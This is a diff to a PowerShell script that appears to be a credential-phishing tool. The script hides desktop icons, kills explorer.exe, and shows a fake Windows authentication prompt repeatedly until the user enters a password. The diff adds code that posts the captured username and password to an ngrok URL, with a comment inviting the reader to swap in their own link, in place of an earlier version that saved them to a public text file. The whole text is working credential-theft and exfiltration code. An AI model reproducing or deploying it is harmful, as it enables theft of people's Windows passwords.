@@ -2,6 +2,8 @@
 REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "HideIcons" /t REG_DWORD /d 1 /f
 taskkill /f /im explorer.exe
 
+$ngrokServer = "http://e7fd536c.ngrok.io/index.php"   #Replace link here
+
 [int]$cnt = 1
 while ( $cnt -lt '1000000000' ) {
  
@@ -23,8 +25,11 @@ while ( $cnt -lt '1000000000' ) {
 	    $choice = [System.Windows.Forms.MessageBox]::Show("Authentication failed! Please enter correct password", "Reconnection Attempt Failed!", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Warning)
 	}		
 
-        else { 
-	    echo $credential.GetNetworkCredential().username":"$credential.GetNetworkCredential().password >C:\Users\Public\passss.txt
+        else {
+            $user = $credential.GetNetworkCredential().username;
+            $pass = $credential.GetNetworkCredential().password;
+            $username = "username: ";
+	    Invoke-WebRequest -Uri $ngrokServer -Method POST -Body $username$domain"\"$user" password: "$pass -ErrorAction Ignore
             REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "HideIcons" /t REG_DWORD /d 0 /f
             start explorer.exe
 	    exit
